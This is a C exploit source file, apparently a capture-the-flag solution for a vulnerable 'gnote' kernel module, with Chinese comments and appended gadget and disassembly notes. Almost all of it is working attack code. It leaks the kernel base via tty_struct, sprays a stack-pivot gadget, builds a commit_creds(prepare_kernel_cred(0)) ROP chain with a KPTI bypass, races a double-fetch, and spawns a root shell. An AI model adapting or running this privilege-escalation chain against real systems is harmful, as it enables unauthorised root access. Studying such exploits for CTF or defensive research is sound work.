//$ gcc -O3 -pthread -static -g -masm=intel ./exp.c -o exp
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <syscall.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/user.h>

typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((reparm(3)))(*_prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

struct data {
    unsigned int menu;
    unsigned int arg;
};

int istriggered =0;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[+] Status has been saved!");
}
void race(void *s)
{
    struct data *d=s;
    while(!istriggered){
        d->menu = 0x9000000; // 0xffffffffc0000000 + (0x8000000+0x1000000)*8 = 0x8000000
        puts("[*] race ...");
    }
}
void shell()
{
    istriggered =1;
    system("/bin/sh");
}
void add_note(int fd, unsigned int size)
{
    struct data d;
    d.menu=1;
    d.arg=size;
    write(fd, (char *)&d, sizeof(struct data));
}
void select_note(int fd, unsigned int idx)
{
    struct data d;
    d.menu=5;
    d.arg = idx;
    write(fd, (char *)&d, sizeof(struct data));
}


int main()
{
    char buf[0x8000];
    struct data race_arg;
    pthread_t pthread;
    save_status();
    int fd;
    // Step 1 : leak kernel address
    fd=open("proc/gnote", O_RDWR);
    if (fd<0)
    {
        puts("[-] Open driver error!");
        exit(-1);
    }
    int fds[50];
    for (int i=0;i<50; i++)
        fds[i]=open("/dev/ptmx", O_RDWR|O_NOCTTY);
    for (int i=0;i<50; i++)
        close(fds[i]);
    add_note(fd,0x2e0);   // tty_struct结构大小0x2e0
    select_note(fd,0);
    read(fd, buf, 512);
    //for (int i=0; i< 20; i++)
    //    printf("%p\n", *(size_t *)(buf+i*8));
    unsigned long leak, kernel_base;
    leak= *(size_t *)(buf+3*8);
    kernel_base = leak - 0xA35360;
    printf("[+] Leak_addr= %p     kernel_base= %p\n", leak , kernel_base);

    unsigned long prepare_kernel_cred = kernel_base + 0x69fe0;
    unsigned long commit_creds        = kernel_base + 0x69df0;
    unsigned long native_write_cr4_addr=kernel_base + (0x8cc3ef20-0x8cc00000);
    unsigned long fake_cr4            = 0x407f0;
    unsigned long xchg_eax_esp_ret    = kernel_base + 0x1992a;  //xchg eax, esp; ret;
    unsigned long pop_rdi_ret         = kernel_base + 0x1c20d;  //pop rdi; ret;
    unsigned long pop_rsi_ret         = kernel_base + 0x37799;  //pop rsi; ret; 
    unsigned long pop_rdx_ret         = kernel_base + 0xdd812;  //pop rdx; ret; 
    unsigned long swapgs_p_ret        = kernel_base + 0x3efc4;  //swapgs; pop rbp; ret; 
    unsigned long iretq_p_ret         = kernel_base + 0x1dd06;  //iretq; pop rbp; ret; 
    unsigned long mov_rdi_rax_p_ret   = kernel_base + 0x21ca6a; //cmp rcx, rsi; mov rdi, rax; ja 0x41ca5d; pop rbp; ret;
    unsigned long kpti_ret            = kernel_base + 0x600a4a;

    // Step 2 : 布置堆喷数据。内核加载最低地址0xffffffffc0000000 + (0x8000000+0x1000000)*8 = 0x8000000
    char *pivot_addr=mmap((void*)0x8000000, 0x1000000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1,0);
    unsigned long *spray_addr= (unsigned long *)pivot_addr;
    for (int i=0; i<0x1000000/8; i++)
        spray_addr[i]=xchg_eax_esp_ret;
    // Step 3 : 布置ROP。由于已经xchg eax,esp  而rax指向xchg地址，所以rop链地址是xchg地址低8位。
    unsigned long mmap_base = xchg_eax_esp_ret & 0xfffff000;
    unsigned long *rop_base = (unsigned long*)(xchg_eax_esp_ret & 0xffffffff);
    char *ropchain = mmap((void *)mmap_base, 0x2000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1,0);
    int i=0;
               // commit_creds(prepare_kernel_cred(0))
    rop_base[i++] = pop_rdi_ret;
    rop_base[i++] = 0;
    rop_base[i++] = prepare_kernel_cred;
    rop_base[i++] = pop_rsi_ret;          //    ja大于则跳转，-1是最大的数
    rop_base[i++] = -1;
    rop_base[i++] = mov_rdi_rax_p_ret;
    rop_base[i++] = 0;
    rop_base[i++] = commit_creds;
               // bypass kpti
    rop_base[i++] = kpti_ret;
    rop_base[i++] = 0;
    rop_base[i++] = 0;
    rop_base[i++] = &shell;
    rop_base[i++] = user_cs;
    rop_base[i++] = user_rflags;
    rop_base[i++] = user_sp;
    rop_base[i++] = user_ss;

    // Step 4 : 开始竞争
    race_arg.arg = 0x10001;
    pthread_create(&pthread,NULL, race, &race_arg);
    for (int j=0; j< 0x10000000000; j++)
    {
        race_arg.menu = 1;
        write(fd, (void*)&race_arg, sizeof(struct data));
    }
    pthread_join(pthread, NULL);
    return 0;
}


/*
1.kernel_base:
0x18:  0xffffffffba435360    -     ffffffffb9a00000   =   0xA35360
ffffffffb9a69fe0 T prepare_kernel_cred

2.ROP gadget:
0xffffffff8101992a: xchg eax, esp; ret; 
0xffffffff8101c20d: pop rdi; ret;
0xffffffff81037799: pop rsi; ret; 
0xffffffff810dd812: pop rdx; ret; 
0xffffffff8103efc4: swapgs; pop rbp; ret; 
0xffffffff8101dd06: iretq; pop rbp; ret; 
0xffffffff8121ca6a: cmp rcx, rsi; mov rdi, rax; ja 0x41ca5d; pop rbp; ret; 


3.下断点
.text:0000000000000019                 cmp     dword ptr [rbx], 5
.text:000000000000001C                 ja      short loc_6E
.text:000000000000001E                 mov     eax, [rbx]
.text:0000000000000020                 mov     rax, ds:off_220[rax*8]
.text:0000000000000028                 jmp     __x86_indirect_thunk_rax

cat /sys/module/gnote/sections/.text

4.kpti_ret
ffffffffbde00a34 T swapgs_restore_regs_and_return_to_usermode

/ # cat /proc/kallsyms| grep ffffffffbde00a
ffffffffbde00a00 t common_interrupt
ffffffffbde00a0f t ret_from_intr
ffffffffbde00a2c T retint_user
ffffffffbde00a34 T swapgs_restore_regs_and_return_to_usermode
ffffffffbde00abb T restore_regs_and_return_to_kernel
ffffffffbde00abb t retint_kernel

gef➤  x /50i 0xffffffffbde00a34
   0xffffffffbde00a34:  pop    r15
   0xffffffffbde00a36:  pop    r14
   0xffffffffbde00a38:  pop    r13
   0xffffffffbde00a3a:  pop    r12
   0xffffffffbde00a3c:  pop    rbp
   0xffffffffbde00a3d:  pop    rbx
   0xffffffffbde00a3e:  pop    r11
   0xffffffffbde00a40:  pop    r10
   0xffffffffbde00a42:  pop    r9
   0xffffffffbde00a44:  pop    r8
   0xffffffffbde00a46:  pop    rax
   0xffffffffbde00a47:  pop    rcx
   0xffffffffbde00a48:  pop    rdx
   0xffffffffbde00a49:  pop    rsi
   0xffffffffbde00a4a:  mov    rdi,rsp                 <<<<<<<<<<<<<<<<<<<<<<
   0xffffffffbde00a4d:  mov    rsp,QWORD PTR gs:0x5004
   0xffffffffbde00a56:  push   QWORD PTR [rdi+0x30]
   0xffffffffbde00a59:  push   QWORD PTR [rdi+0x28]
   0xffffffffbde00a5c:  push   QWORD PTR [rdi+0x20]
   0xffffffffbde00a5f:  push   QWORD PTR [rdi+0x18]
   0xffffffffbde00a62:  push   QWORD PTR [rdi+0x10]
   0xffffffffbde00a65:  push   QWORD PTR [rdi]
   0xffffffffbde00a67:  push   rax
   0xffffffffbde00a68:  xchg   ax,ax
   0xffffffffbde00a6a:  mov    rdi,cr3
   0xffffffffbde00a6d:  jmp    0xffffffffbde00aa3
   0xffffffffbde00a6f:  mov    rax,rdi
   0xffffffffbde00a72:  and    rdi,0x7ff
   0xffffffffbde00a79:  bt     QWORD PTR gs:0x1d996,rdi
   0xffffffffbde00a83:  jae    0xffffffffbde00a94
   0xffffffffbde00a85:  btr    QWORD PTR gs:0x1d996,rdi
   0xffffffffbde00a8f:  mov    rdi,rax
   0xffffffffbde00a92:  jmp    0xffffffffbde00a9c
   0xffffffffbde00a94:  mov    rdi,rax
   0xffffffffbde00a97:  bts    rdi,0x3f
   0xffffffffbde00a9c:  or     rdi,0x800
   0xffffffffbde00aa3:  or     rdi,0x1000
   0xffffffffbde00aaa:  mov    cr3,rdi
   0xffffffffbde00aad:  pop    rax
   0xffffffffbde00aae:  pop    rdi
   0xffffffffbde00aaf:  swapgs 
   0xffffffffbde00ab2:  nop    DWORD PTR [rax]
   0xffffffffbde00ab5:  jmp    0xffffffffbde00ae0
   0xffffffffbde00aba:  nop

*/









